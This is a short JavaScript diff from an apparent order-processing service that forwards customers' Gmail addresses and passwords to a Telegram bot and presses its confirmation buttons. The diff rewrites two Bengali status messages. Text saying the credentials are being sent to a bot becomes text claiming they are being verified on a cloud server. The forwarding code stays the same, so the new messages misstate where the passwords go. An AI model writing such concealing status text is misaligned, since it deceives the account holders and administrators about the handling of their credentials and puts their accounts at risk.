@@ -2968,7 +2968,7 @@ async function processOrder(orderId, orderData) {
         console.log(`[BOT SEND] Sending credentials for Order ${orderId}: ${maskGmail(orderData.accEmail)}`);
         const credSentTime = Date.now();
         
-        await orderRef.update({ adminMsg: "বটের কাছে জিমেইল ও পাসওয়ার্ড পাঠানো হচ্ছে..." });
+        await orderRef.update({ adminMsg: "ক্লাউড সার্ভারে জিমেইল তথ্য যাচাই করা হচ্ছে..." });
         await tg.sendMessage(TARGET_BOT, { message: credText });
 
         let confirmFound = await waitForCondition((m) => {
@@ -2982,7 +2982,7 @@ async function processOrder(orderId, orderData) {
             if (!confClicked) confClicked = await clickInlineButton(confirmFound.msg, "Confirm credentials", tg);
             if (!confClicked) await clickInlineButton(confirmFound.msg, "Confirm", tg);
         }
-        await orderRef.update({ adminMsg: "লগইন তথ্য সফলভাবে বটের কাছে পাঠানো হয়েছে! লগইন চলছে..." });
+        await orderRef.update({ adminMsg: "লগইন তথ্য সফলভাবে গৃহীত হয়েছে। ক্লাউড ভেরিফিকেশন চলছে..." });
 
         let completed = false;
         let attempts = 0;
